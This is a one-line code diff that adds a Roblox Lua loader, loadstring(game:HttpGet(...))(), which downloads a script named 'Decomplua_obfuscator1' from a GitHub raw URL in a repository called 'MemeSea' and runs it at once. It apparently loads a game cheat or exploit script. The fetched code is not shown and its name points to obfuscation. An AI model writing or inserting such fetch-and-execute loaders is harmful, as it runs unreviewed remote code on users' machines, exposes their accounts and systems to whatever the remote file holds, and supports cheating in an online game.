@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/alodozhynn/MemeSea/patch-1/Decomplua_obfuscator1"))()
